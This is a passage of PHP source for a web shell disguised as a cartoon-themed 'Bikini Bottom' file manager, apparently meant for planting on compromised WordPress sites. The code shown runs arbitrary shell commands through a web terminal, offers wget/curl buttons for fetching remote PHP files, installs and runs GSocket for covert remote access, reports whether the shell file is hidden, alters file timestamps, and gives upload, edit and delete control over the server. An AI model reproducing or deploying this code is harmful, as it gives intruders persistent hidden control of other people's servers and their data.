                if ($zip->extractTo($current_dir)) {
                    $extracted = true;
                    $_SESSION['msg'] = "✅ ZIP extracted";
                }
                $zip->close();
            }
        }
        
        if (!$extracted && function_exists('shell_exec') && !ini_get('safe_mode')) {
            $cmd = 'cd "' . addslashes($current_dir) . '" && unzip -o ' . escapeshellarg(basename($target)) . ' 2>&1';
            $out = @shell_exec($cmd);
            if (strpos($out, 'inflating:') !== false) {
                $extracted = true;
                $_SESSION['msg'] = "✅ ZIP extracted (shell)";
            }
        }
        
        if (!$extracted) $_SESSION['msg'] = "❌ Failed to extract";
    }
    $redirect = $_SERVER['PHP_SELF'] . "?lee=30&p=" . urlencode($current_dir);
    header("Location: " . $redirect);
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    if (!headers_sent()) {
        @setcookie('wp_' . substr(md5($host), 0, 8), '', time() - 3600, '/');
    }
    echo '<script>window.location.href="?";</script>';
    exit;
}

// ============================================================
// HTML OUTPUT - TEMA SPONGEBOB
// ============================================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🍍 Bikini Bottom Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* ============================================================
           TEMA SPONGEBOB SQUAREPANTS
           ============================================================ */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Comic Sans MS', 'Chalkboard SE', 'Segoe UI', cursive, sans-serif;
            background: linear-gradient(180deg, #87CEEB 0%, #4FC3F7 40%, #29B6F6 60%, #4FC3F7 80%, #87CEEB 100%);
            min-height: 100vh;
            color: #2d2d2d;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Bubbles animation */
        .bubbles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
        
        .bubble {
            position: absolute;
            bottom: -50px;
            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.4), rgba(255,255,255,0.1));
            border-radius: 50%;
            border: 1px solid rgba(255,255,255,0.2);
            animation: rise linear infinite;
        }
        
        @keyframes rise {
            0% { transform: translateY(0) scale(0.5); opacity: 0.8; }
            100% { transform: translateY(-110vh) scale(1.2); opacity: 0; }
        }
        
        .bubble:nth-child(1) { width: 20px; height: 20px; left: 5%; animation-duration: 15s; animation-delay: 0s; }
        .bubble:nth-child(2) { width: 35px; height: 35px; left: 15%; animation-duration: 20s; animation-delay: 2s; }
        .bubble:nth-child(3) { width: 15px; height: 15px; left: 25%; animation-duration: 12s; animation-delay: 4s; }
        .bubble:nth-child(4) { width: 40px; height: 40px; left: 35%; animation-duration: 18s; animation-delay: 1s; }
        .bubble:nth-child(5) { width: 25px; height: 25px; left: 45%; animation-duration: 22s; animation-delay: 3s; }
        .bubble:nth-child(6) { width: 30px; height: 30px; left: 55%; animation-duration: 16s; animation-delay: 5s; }
        .bubble:nth-child(7) { width: 18px; height: 18px; left: 65%; animation-duration: 19s; animation-delay: 2s; }
        .bubble:nth-child(8) { width: 45px; height: 45px; left: 75%; animation-duration: 14s; animation-delay: 4s; }
        .bubble:nth-child(9) { width: 22px; height: 22px; left: 85%; animation-duration: 21s; animation-delay: 1s; }
        .bubble:nth-child(10) { width: 28px; height: 28px; left: 95%; animation-duration: 17s; animation-delay: 3s; }
        .bubble:nth-child(11) { width: 32px; height: 32px; left: 10%; animation-duration: 23s; animation-delay: 6s; }
        .bubble:nth-child(12) { width: 16px; height: 16px; left: 50%; animation-duration: 13s; animation-delay: 2s; }
        
        /* Main container */
        .wrap {
            max-width: 1400px;
            margin: 0 auto;
            padding: 16px;
            position: relative;
            z-index: 1;
        }
        
        /* SpongeBob themed card */
        .card {
            background: rgba(255, 234, 0, 0.85);
            backdrop-filter: blur(10px);
            border: 4px solid #f57c00;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 16px;
            box-shadow: 
                0 8px 32px rgba(0,0,0,0.2),
                inset 0 -4px 0 rgba(0,0,0,0.1),
                inset 0 4px 0 rgba(255,255,255,0.3);
            position: relative;
        }
        
        .card::before {
            content: "🍍";
            position: absolute;
            top: -15px;
            right: 20px;
            font-size: 40px;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
        }
        
        .card-blue {
            background: rgba(33, 150, 243, 0.85);
            border-color: #0d47a1;
        }
        
        .card-blue::before {
            content: "🌊";
        }
        
        .card-pink {
            background: rgba(233, 30, 99, 0.85);
            border-color: #880e4f;
        }
        
        .card-pink::before {
            content: "🐚";
        }
        
        .card-green {
            background: rgba(76, 175, 80, 0.85);
            border-color: #1b5e20;
        }
        
        .card-green::before {
            content: "🌿";
        }
        
        /* Header */
        .header {
            padding: 24px;
            text-align: center;
            background: linear-gradient(135deg, rgba(255, 234, 0, 0.9), rgba(255, 193, 7, 0.9));
            border-color: #f57c00;
        }
        
        .header h1 {
            font-size: 3rem;
            font-weight: 900;
            color: #1a237e;
            text-shadow: 
                4px 4px 0 #f57c00,
                6px 6px 0 rgba(0,0,0,0.2);
            letter-spacing: 2px;
        }
        
        .header .sub {
            font-size: 1rem;
            color: #4a148c;
            font-weight: 600;
            margin-top: 4px;
        }
        
        .header .spongebob-emoji {
            font-size: 50px;
            display: block;
            margin-bottom: 10px;
        }
        
        /* Path navigation */
        .path {
            padding: 10px 14px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            background: rgba(0,0,0,0.15);
            border-radius: 12px;
            margin: 12px 0;
            word-break: break-all;
            border: 2px solid rgba(0,0,0,0.1);
        }
        
        .path a {
            color: #0d47a1;
            text-decoration: none;
            padding: 2px 8px;
            border-radius: 6px;
            font-weight: 700;
            transition: all 0.2s;
        }
        
        .path a:hover {
            background: rgba(255,255,255,0.4);
            transform: scale(1.05);
        }
        
        /* Status badge */
        .status {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            padding: 8px 14px;
            font-size: 13px;
            background: rgba(0,0,0,0.1);
            border-radius: 12px;
            margin-bottom: 12px;
            border: 2px solid rgba(0,0,0,0.08);
            font-weight: 600;
        }
        
        .status span {
            color: #1a237e;
        }
        
        .status .v {
            color: #4a148c;
            font-weight: 800;
        }
        
        /* Buttons - SpongeBob style */
        .btn {
            display: inline-block;
            padding: 10px 22px;
            border-radius: 50px;
            border: 3px solid #1a237e;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            font-size: 14px;
            background: #fff;
            color: #1a237e;
            font-family: 'Comic Sans MS', cursive;
            box-shadow: 0 4px 0 #0d47a1;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 0 #0d47a1;
        }
        
        .btn:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #0d47a1;
        }
        
        .btn-primary {
            background: #ffeb3b;
            border-color: #f57c00;
            color: #1a237e;
            box-shadow: 0 4px 0 #f57c00;
        }
        
        .btn-primary:hover {
            box-shadow: 0 6px 0 #f57c00;
        }
        
        .btn-danger {
            background: #f44336;
            border-color: #b71c1c;
            color: #fff;
            box-shadow: 0 4px 0 #b71c1c;
        }
        
        .btn-danger:hover {
            box-shadow: 0 6px 0 #b71c1c;
        }
        
        .btn-success {
            background: #4caf50;
            border-color: #1b5e20;
            color: #fff;
            box-shadow: 0 4px 0 #1b5e20;
        }
        
        .btn-success:hover {
            box-shadow: 0 6px 0 #1b5e20;
        }
        
        .btn-warning {
            background: #ff9800;
            border-color: #e65100;
            color: #fff;
            box-shadow: 0 4px 0 #e65100;
        }
        
        .btn-warning:hover {
            box-shadow: 0 6px 0 #e65100;
        }
        
        .btn-ghost {
            background: rgba(255,255,255,0.3);
            border-color: #1a237e;
            color: #1a237e;
            box-shadow: 0 4px 0 #1a237e;
        }
        
        .btn-ghost:hover {
            box-shadow: 0 6px 0 #1a237e;
        }
        
        .actions {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 16px;
            justify-content: center;
        }
        
        /* Messages */
        .msg {
            padding: 10px 16px;
            border-radius: 12px;
            margin-bottom: 8px;
            background: rgba(255,255,255,0.4);
            border-left: 6px solid #ffeb3b;
            font-weight: 600;
        }
        
        .msg.ok {
            border-color: #4caf50;
            background: rgba(76, 175, 80, 0.2);
        }
        
        .msg.err {
            border-color: #f44336;
            background: rgba(244, 67, 54, 0.2);
        }
        
        /* Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }
        
        .grid .card h3 {
            color: #1a237e;
            font-size: 1.1rem;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 800;
        }
        
        /* Inputs */
        .input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.6);
            border: 3px solid #1a237e;
            border-radius: 50px;
            color: #1a237e;
            font-size: 14px;
            margin-bottom: 10px;
            transition: 0.2s;
            font-family: 'Comic Sans MS', cursive;
        }
        
        .input:focus {
            outline: none;
            border-color: #f57c00;
            box-shadow: 0 0 0 4px rgba(245, 124, 0, 0.3);
        }
        
        .input::placeholder {
            color: #5c6bc0;
        }
        
        select.input {
            appearance: none;
            cursor: pointer;
        }
        
        /* Table */
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th {
            padding: 10px 12px;
            text-align: left;
            font-weight: 800;
            color: #1a237e;
            border-bottom: 3px solid #1a237e;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            background: rgba(255,234,0,0.3);
        }
        
        td {
            padding: 8px 12px;
            border-bottom: 2px solid rgba(0,0,0,0.05);
        }
        
        tr:hover td {
            background: rgba(255,234,0,0.2);
        }
        
        .name {
            color: #0d47a1;
            text-decoration: none;
            font-weight: 700;
            padding: 2px 8px;
            border-radius: 6px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
        }
        
        .name:hover {
            background: rgba(255,234,0,0.4);
            transform: scale(1.02);
        }
        
        .folder {
            color: #1b5e20;
        }
        
        .perm {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 50px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            font-weight: 700;
            border: 2px solid transparent;
        }
        
        .perm-w {
            background: rgba(76, 175, 80, 0.2);
            color: #1b5e20;
            border-color: #4caf50;
        }
        
        .perm-r {
            background: rgba(244, 67, 54, 0.2);
            color: #b71c1c;
            border-color: #f44336;
        }
        
        .act {
            padding: 4px 12px;
            border-radius: 50px;
            font-size: 12px;
            margin: 2px;
            display: inline-block;
            text-decoration: none;
            font-weight: 700;
            transition: all 0.2s;
            background: rgba(255,255,255,0.4);
            color: #1a237e;
            border: 2px solid #1a237e;
        }
        
        .act:hover {
            background: #ffeb3b;
            transform: scale(1.05);
        }
        
        /* Terminal */
        .term-out {
            background: rgba(0,0,0,0.7);
            padding: 16px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 12px;
            line-height: 1.6;
            border: 3px solid #f57c00;
            color: #aed581;
        }
        
        .term-out .ok { color: #81c784; }
        .term-out .err { color: #ef9a9a; }
        .term-out .info { color: #90caf9; }
        
        /* Editor */
        .editor textarea {
            width: 100%;
            height: 350px;
            background: rgba(0,0,0,0.7);
            color: #aed581;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border: 3px solid #f57c00;
            border-radius: 12px;
            padding: 16px;
            resize: vertical;
        }
        
        .editor textarea:focus {
            outline: none;
            border-color: #ffeb3b;
            box-shadow: 0 0 0 4px rgba(255,234,0,0.3);
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(4px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-box {
            background: #ffeb3b;
            border: 6px solid #f57c00;
            border-radius: 30px;
            padding: 30px;
            max-width: 480px;
            width: 90%;
            animation: bounceIn 0.4s ease;
            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
        }
        
        @keyframes bounceIn {
            0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }
            70% { transform: scale(1.05) rotate(2deg); }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }
        
        .modal-box h3 {
            color: #1a237e;
            font-size: 1.5rem;
            margin-bottom: 16px;
            font-weight: 900;
        }
        
        .modal-box .input {
            background: rgba(255,255,255,0.8);
        }
        
        input[type="checkbox"] {
            accent-color: #ffeb3b;
            width: 18px;
            height: 18px;
            cursor: pointer;
            border: 2px solid #1a237e;
        }
        
        /* GSocket section */
        .gs-section {
            margin: 15px 0;
            padding: 12px;
            background: rgba(0,0,0,0.1);
            border-radius: 12px;
            border: 3px solid #f57c00;
        }
        
        .gs-section .btns {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        /* Quick commands */
        .quick {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        .quick button {
            background: rgba(255,255,255,0.3);
            border: 2px solid #1a237e;
            border-radius: 50px;
            color: #1a237e;
            padding: 4px 12px;
            font-size: 11px;
            cursor: pointer;
            transition: 0.2s;
            font-weight: 700;
            font-family: 'Comic Sans MS', cursive;
        }
        
        .quick button:hover {
            background: #ffeb3b;
            transform: scale(1.05);
        }
        
        /* Toggle terminal */
        .toggle-term {
            text-align: center;
            margin: 12px 0;
            cursor: pointer;
            padding: 10px;
            transition: all 0.2s;
        }
        
        .toggle-term:hover {
            transform: scale(1.05);
        }
        
        .toggle-term .icon {
            font-size: 48px;
            display: block;
        }
        
        .toggle-term .label {
            font-size: 12px;
            color: #1a237e;
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(255,255,255,0.5);
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #f57c00; border-radius: 4px; border: 2px solid #ffeb3b; }
        ::-webkit-scrollbar-thumb:hover { background: #e65100; }
        
        /* Responsive */
        @media (max-width: 640px) {
            .wrap { padding: 10px; }
            .grid { grid-template-columns: 1fr; }
            .actions { flex-direction: column; }
            .btn { width: 100%; text-align: center; justify-content: center; }
            .header h1 { font-size: 2rem; }
            .modal-box { padding: 20px; }
        }
    </style>
</head>
<body>
    <!-- Bubbles background -->
    <div class="bubbles">
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
    </div>
    
    <div class="wrap">
        <!-- HEADER -->
        <div class="card header">
            <span class="spongebob-emoji">🧽</span>
            <h1>🍍 Bikini Bottom</h1>
            <div class="sub">~ File Manager ~</div>
            
            <div class="path">
                <?php
                $parts = explode('/', trim($current_dir, '/'));
                $cur = '';
                echo '<a href="?lee=30&p=/">🏠</a>';
                foreach ($parts as $part) {
                    if ($part) {
                        $cur .= '/' . $part;
                        echo '/<a href="?lee=30&p=' . urlencode($cur) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <div class="status">
                <span>🔧 Perm: <span class="v"><?php $p = @fileperms($current_dir); echo $p ? substr(sprintf('%o', $p), -4) : '????'; ?></span></span>
                <span>💾 Free: <span class="v"><?php $f = @disk_free_space($current_dir); echo $f ? round($f/1024/1024/1024, 2) : '?'; ?>GB</span></span>
                <span>🔒 Status: <span class="v"><?php echo wp_is_hidden(__FILE__) ? '🫣 Hidden' : '👀 Visible'; ?></span></span>
            </div>
            
            <?php if (!empty($messages)): ?>
                <div>
                    <?php foreach ($messages as $msg): ?>
                        <?php $ok = strpos($msg, '✅') !== false; ?>
                        <div class="msg <?php echo $ok ? 'ok' : 'err'; ?>"><?php echo htmlspecialchars($msg); ?></div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
            
            <div class="actions">
                <a href="?lee=30&p=<?php echo urlencode($_SESSION['home_dir']); ?>" class="btn btn-primary">🏠 Home</a>
                <a href="?lee=30&p=<?php echo urlencode(dirname($current_dir)); ?>" class="btn btn-ghost">⬅ Back</a>
                <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>" class="btn btn-ghost">🔄 Refresh</a>
                <button class="btn btn-success" onclick="showCreate()">➕ Create</button>
                <button class="btn btn-danger" onclick="showDelete()">🗑 Delete</button>
                <a href="?lee=30&logout=1" class="btn btn-danger">🚪 Logout</a>
            </div>
        </div>
        
        <!-- TERMINAL TOGGLE -->
        <div class="toggle-term" onclick="toggleTerm()">
            <span class="icon">🧽</span>
            <span class="label">⚡ Click to open Terminal ⚡</span>
        </div>
        
        <div id="termContainer" style="display:none;">
            <div class="card card-blue">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                    <h3 style="color:#1a237e;font-size:1.2rem;">⚡ Terminal</h3>
                    <span style="cursor:pointer;color:#1a237e;font-size:24px;font-weight:900;" onclick="toggleTerm()">✕</span>
                </div>
                
                <div style="background:rgba(0,0,0,0.15);padding:8px 12px;border-radius:8px;margin-bottom:12px;font-family:monospace;font-size:12px;border:2px solid #0d47a1;">
                    📁 <?php echo htmlspecialchars($current_dir); ?>
                </div>
                
                <form method="post" id="termForm">
                    <div style="display:flex;gap:8px;">
                        <span style="color:#1a237e;font-family:monospace;font-weight:900;font-size:18px;">$</span>
                        <input type="text" name="cmd" placeholder="ls -la | pwd | wget -O file.php url" class="input" style="margin-bottom:0;" id="cmdInput">
                        <button type="submit" class="btn btn-primary">Run</button>
                    </div>
                </form>
                
                <!-- GSOCKET SECTION -->
                <div class="gs-section">
                    <div style="text-align:center;font-size:12px;color:#1a237e;font-weight:700;margin-bottom:8px;">🚀 GSocket Tools</div>
                    <div class="btns">
                        <form method="post" style="display:inline;"><input type="hidden" name="gs" value="install"><button class="btn btn-success" style="font-size:11px;padding:4px 14px;"><i class="fas fa-download"></i> Install</button></form>
                        <form method="post" style="display:inline;"><input type="hidden" name="gs" value="run"><button class="btn btn-warning" style="font-size:11px;padding:4px 14px;"><i class="fas fa-play"></i> Run</button></form>
                        <form method="post" style="display:inline;"><input type="hidden" name="gs" value="kill"><button class="btn btn-danger" style="font-size:11px;padding:4px 14px;"><i class="fas fa-skull"></i> Kill</button></form>
                        <form method="post" style="display:inline;" onsubmit="return confirm('Uninstall GSocket?')"><input type="hidden" name="gs" value="uninstall"><button class="btn btn-ghost" style="font-size:11px;padding:4px 14px;"><i class="fas fa-trash"></i> Uninstall</button></form>
                    </div>
                    <div style="text-align:center;font-size:10px;color:#1a237e;margin-top:6px;font-weight:600;">
                        <i class="fas fa-info-circle"></i> Install dulu, lalu Run untuk dapat SECRET
                    </div>
                </div>
                
                <div id="termOutput"></div>
                
                <div class="quick">
                    <span style="color:#1a237e;font-weight:700;font-size:11px;">⚡:</span>
                    <button onclick="setCmd('wget -O file.php https://raw.githubusercontent.com/example/file.php')">wget -O</button>
                    <button onclick="setCmd('curl -o file.php https://raw.githubusercontent.com/example/file.php')">curl -o</button>
                    <button onclick="setCmd('ls -la')">ls -la</button>
                    <button onclick="setCmd('pwd')">pwd</button>
                    <button onclick="setCmd('php -v')">php -v</button>
                    <button onclick="setCmd('whoami')">whoami</button>
                </div>
            </div>
        </div>
        
        <!-- UPLOAD GRID -->
        <div class="grid">
            <div class="card card-pink">
                <h3>📤 Upload Files</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="files[]" class="input" multiple required>
                    <button type="submit" class="btn btn-primary" style="width:100%;">Upload</button>
                </form>
            </div>
            
            <div class="card card-green">
                <h3>📦 Upload & Extract ZIP</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="zip" class="input" accept=".zip" required>
                    <button type="submit" class="btn btn-success" style="width:100%;">Upload & Extract</button>
                </form>
            </div>
        </div>
        
        <!-- FILE TABLE -->
        <div class="card" style="overflow-x:auto;">
            <table>
                <thead>
                    <tr>
                        <th><input type="checkbox" id="selectAll"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perm</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $items = @scandir($current_dir);
                    if ($items !== false) {
                        $folders = $files = [];
                        foreach ($items as $item) {
                            if ($item == '.' || $item == '..') continue;
                            $path = $current_dir . $item;
                            if (@is_dir($path)) $folders[] = $item;
                            else $files[] = $item;
                        }
                        sort($folders); sort($files);
                        
                        foreach ($folders as $item) {
                            $path = $current_dir . $item;
                            $perm = wp_get_perm($path);
                            $mod = date('Y-m-d H:i', @filemtime($path));
                            ?>
                            <tr>
                                <td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($item); ?>" class="cb"></td>
                                <td><a href="?lee=30&p=<?php echo urlencode($path); ?>" class="name folder">📁 <?php echo htmlspecialchars($item); ?></a></td>
                                <td>-</td>
                                <td><span class="perm <?php echo $perm['writable'] ? 'perm-w' : 'perm-r'; ?>"><?php echo $perm['octal']; ?></span></td>
                                <td><?php echo $mod; ?></td>
                                <td>
                                    <a href="#" onclick="showRename('<?php echo addslashes($item); ?>')" class="act" title="Rename">✏️</a>
                                    <a href="#" onclick="showTouch('<?php echo addslashes($item); ?>')" class="act" title="Change time">📅</a>
                                    <a href="#" onclick="showChmod('<?php echo addslashes($item); ?>', '<?php echo $perm['octal']; ?>')" class="act" title="Chmod">🔧</a>
                                    <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>&del=<?php echo urlencode($item); ?>" class="act" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')" title="Delete">🗑</a>
                                </td>
                            </tr>
                            <?php
                        }
                        
                        foreach ($files as $item) {
                            $path = $current_dir . $item;
                            $size = @filesize($path);
                            $perm = wp_get_perm($path);
                            $mod = date('Y-m-d H:i', @filemtime($path));
                            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                            ?>
                            <tr>
                                <td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($item); ?>" class="cb"></td>
                                <td><a href="?lee=30&p=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>" class="name">📄 <?php echo htmlspecialchars($item); ?></a></td>
                                <td><?php echo $size ? wp_format_size($size) : '?'; ?></td>
                                <td><span class="perm <?php echo $perm['writable'] ? 'perm-w' : 'perm-r'; ?>"><?php echo $perm['octal']; ?></span></td>
                                <td><?php echo $mod; ?></td>
                                <td>
                                    <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>" class="act" title="Edit">✏️</a>
                                    <?php if ($ext == 'zip'): ?>
                                        <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>&extract=<?php echo urlencode($item); ?>" class="act" onclick="return confirm('Extract <?php echo addslashes($item); ?>?')" title="Extract">📦</a>
                                    <?php endif; ?>
                                    <a href="#" onclick="showRename('<?php echo addslashes($item); ?>')" class="act" title="Rename">✏️</a>
                                    <a href="#" onclick="showTouch('<?php echo addslashes($item); ?>')" class="act" title="Change time">📅</a>
                                    <a href="#" onclick="showChmod('<?php echo addslashes($item); ?>', '<?php echo $perm['octal']; ?>')" class="act" title="Chmod">🔧</a>
                                    <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>&del=<?php echo urlencode($item); ?>" class="act" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')" title="Delete">🗑</a>
                                </td>
                            </tr>
                            <?php
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
        
        <!-- EDITOR -->
        <?php if (isset($editing_file) && $editing_file !== null): ?>
        <div class="card editor">
            <h3 style="color:#1a237e;margin-bottom:12px;font-size:1.2rem;">✏️ Editing: <?php echo htmlspecialchars($editing_file); ?></h3>
            <form method="post">
                <textarea name="content" spellcheck="false"><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editing_file); ?>">
                <div style="margin-top:12px;display:flex;gap:8px;">
                    <button type="submit" class="btn btn-success">💾 Save</button>
                    <a href="?lee=30&p=<?php echo urlencode($current_dir); ?>" class="btn btn-ghost">Cancel</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- TERMINAL OUTPUT -->
        <?php if (!empty($cmd_output) && trim($cmd_output) !== ''): ?>
        <div class="card card-blue">
            <h3 style="color:#1a237e;font-size:1.1rem;margin-bottom:8px;">📟 Output</h3>
            <div class="term-out">
                <?php 
                $lines = explode("\n", $cmd_output);
                foreach ($lines as $line) {
                    $line = htmlspecialchars($line);
                    if (strpos($line, '✅') !== false) echo '<div class="ok">' . $line . '</div>';
                    elseif (strpos($line, '❌') !== false || strpos($line, 'blocked') !== false) echo '<div class="err">' . $line . '</div>';
                    elseif (strpos($line, '[STDERR]') !== false) echo '<div class="err">' . $line . '</div>';
                    elseif (strpos($line, '━') !== false || strpos($line, 'SECRET') !== false) echo '<div class="info">' . $line . '</div>';
                    else echo '<div>' . $line . '</div>';
                }
                ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    
    <!-- ============================================================ -->
    <!-- MODALS -->
    <!-- ============================================================ -->
    
    <!-- Create Modal -->
    <div class="modal" id="createModal">
        <div class="modal-box">
            <h3>➕ Create New</h3>
            <form method="post">
                <input type="text" name="name" class="input" placeholder="Name" required>
                <select name="type" class="input">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <textarea name="data" class="input" placeholder="Content (for files)" rows="4"></textarea>
                <input type="hidden" name="create" value="1">
                <div style="display:flex;gap:8px;margin-top:12px;">
                    <button type="submit" class="btn btn-success" style="flex:2;">Create</button>
                    <button type="button" class="btn btn-ghost" style="flex:1;" onclick="hideModal('createModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Chmod Modal -->
    <div class="modal" id="chmodModal">
        <div class="modal-box">
            <h3>🔧 Change Permissions</h3>
            <form method="post">
                <input type="hidden" name="chmod_file" id="chmodFile">
                <input type="text" name="perms" id="chmodPerm" class="input" placeholder="e.g., 0755" pattern="[0-7]{4}" required>
                <small style="color:#1a237e;font-weight:600;">Common: 0755 (rwxr-xr-x), 0644 (rw-r--r--), 0777 (rwxrwxrwx)</small>
                <div style="display:flex;gap:8px;margin-top:12px;">
                    <button type="submit" name="chmod" value="1" class="btn btn-primary" style="flex:2;">Apply</button>
                    <button type="button" class="btn btn-ghost" style="flex:1;" onclick="hideModal('chmodModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Touch Modal -->
    <div class="modal" id="touchModal">
        <div class="modal-box">
            <h3>📅 Change Time</h3>
            <form method="post">
                <input type="hidden" name="touch_file" id="touchFile">
                <input type="datetime-local" name="timestamp" id="touchTime" class="input" required>
                <div style="display:flex;gap:8px;margin-top:12px;">
                    <button type="submit" name="touch" value="1" class="btn btn-primary" style="flex:2;">Apply</button>
                    <button type="button" class="btn btn-ghost" style="flex:1;" onclick="hideModal('touchModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div class="modal" id="renameModal">
        <div class="modal-box">
            <h3>✏️ Rename</h3>
            <form method="post">
                <input type="hidden" name="rename_old" id="renameOld">
                <input type="text" name="rename_new" id="renameNew" class="input" placeholder="New name" required>
                <div style="display:flex;gap:8px;margin-top:12px;">
                    <button type="submit" name="rename" value="1" class="btn btn-primary" style="flex:2;">Rename</button>
                    <button type="button" class="btn btn-ghost" style="flex:1;" onclick="hideModal('renameModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Delete Modal -->
    <div class="modal" id="deleteModal">
        <div class="modal-box">
            <h3>🗑 Confirm Delete</h3>
            <p style="color:#1a237e;font-weight:600;margin-bottom:16px;">Are you sure you want to delete selected items?</p>
            <form method="post" id="deleteForm">
                <div id="selectedItems"></div>
                <div style="display:flex;gap:8px;">
                    <button type="submit" name="delete_selected" value="1" class="btn btn-danger" style="flex:2;">Delete</button>
                    <button type="button" class="btn btn-ghost" style="flex:1;" onclick="hideModal('deleteModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- ============================================================ -->
    <!-- JAVASCRIPT -->
    <!-- ============================================================ -->
    <script>
    function toggleTerm() {
        var c = document.getElementById('termContainer');
        c.style.display = c.style.display === 'none' ? 'block' : 'none';
    }
    
    function showModal(id) { document.getElementById(id).style.display = 'flex'; }
    function hideModal(id) { document.getElementById(id).style.display = 'none'; }
    
    function showCreate() { 
        showModal('createModal'); 
        document.querySelector('#createModal input[name="name"]').focus(); 
    }
    
    function showDelete() {
        var cbs = document.querySelectorAll('.cb:checked');
        if (cbs.length === 0) { alert('Select items to delete'); return; }
        var container = document.getElementById('selectedItems');
        container.innerHTML = '';
        cbs.forEach(function(cb) {
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'selected[]';
            input.value = cb.value;
            container.appendChild(input);
        });
        showModal('deleteModal');
    }
    
    function showChmod(file, perm) {
        document.getElementById('chmodFile').value = file;
        document.getElementById('chmodPerm').value = perm;
        showModal('chmodModal');
        document.getElementById('chmodPerm').focus();
    }
    
    function showTouch(file) {
        document.getElementById('touchFile').value = file;
        var now = new Date();
        var year = now.getFullYear();
        var month = String(now.getMonth() + 1).padStart(2, '0');
        var day = String(now.getDate()).padStart(2, '0');
        var hours = String(now.getHours()).padStart(2, '0');
        var minutes = String(now.getMinutes()).padStart(2, '0');
